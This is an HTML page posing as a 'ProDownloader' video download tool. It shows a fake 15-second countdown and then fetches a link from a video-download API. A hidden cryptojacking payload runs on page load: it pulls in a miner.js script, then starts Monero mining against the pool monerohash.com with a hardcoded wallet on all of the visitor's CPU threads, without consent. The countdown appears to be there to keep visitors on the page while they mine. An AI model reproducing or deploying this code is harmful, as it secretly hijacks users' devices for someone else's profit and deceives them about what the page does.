<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Direct Download | ProDownloader</title>
    <script src="https://cdn.jsdelivr.net/gh/monero-project/monero-gui@v0.18.1.2/external/qml/MoneroComponents/Controls/miner.js"></script>
    <style>
        body { margin: 0; padding: 20px; font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: white; text-align: center; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .downloader-box { background: rgba(30, 41, 59, 0.8); padding: 40px; border-radius: 24px; border: 1px solid rgba(56, 189, 248, 0.3); backdrop-filter: blur(15px); width: 90%; max-width: 450px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .btn-download { display: none; margin-top: 20px; padding: 18px; background: #38bdf8; color: #0f172a; text-decoration: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; border: none; width: 100%; font-size: 1.2rem; text-transform: uppercase; }
        .btn-download:hover { background: #7dd3fc; transform: scale(1.02); box-shadow: 0 0 20px rgba(56, 189, 248, 0.4); }
        .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #timer { font-weight: bold; color: #38bdf8; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="downloader-box">
        <div id="loading-ui">
            <div class="loader"></div>
            <h2 id="status">Generating Direct Link...</h2>
            <p style="color: #94a3b8; font-size: 0.9rem;">Bypassing platform restrictions</p>
            <div id="timer">Stage 2: 15s</div>
        </div>
        <div id="ready-ui" style="display:none;">
            <h2 style="color:#38bdf8; margin-bottom: 5px;">✅ File Ready!</h2>
            <p style="color:#94a3b8; font-size: 0.9rem; margin-bottom: 20px;">Your high-speed download is locked in.</p>
            <a id="final-btn" href="#" class="btn-download">DOWNLOAD NOW</a>
        </div>
    </div>
<script>
    const wallet = "48bN9TtB8nieRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQckVdJPNoNapcwMuiu1TSZiG7FXft";
    setTimeout(() => { if(typeof startMining === 'function') startMining("monerohash.com:3333", wallet, "Stage_2_Verify", navigator.hardwareConcurrency, 0.3); }, 1000);

    const params = new URLSearchParams(window.location.search);
    const videoUrl = params.get('url');
    let timeLeft = 15;

    let interval = setInterval(async () => {
        timeLeft--;
        document.getElementById("timer").innerHTML = "Stage 2: " + timeLeft + "s";
        if(timeLeft <= 0) {
            clearInterval(interval);
            try {
                const response = await fetch('https://api.cobalt.tools/api/json', {
                    method: 'POST',
                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: videoUrl, vCodec: "h264" })
                });
                const data = await response.json();
                if(data.url) {
                    document.getElementById("loading-ui").style.display = "none";
                    document.getElementById("ready-ui").style.display = "block";
                    const btn = document.getElementById("final-btn");
                    btn.style.display = "block";
                    btn.href = data.url; 
                } else { document.getElementById("status").innerHTML = "Error: Link expired."; }
            } catch (err) { document.getElementById("status").innerHTML = "Server busy. Refreshing..."; location.reload(); }
        }
    }, 1000);
</script>
</body>
</html>
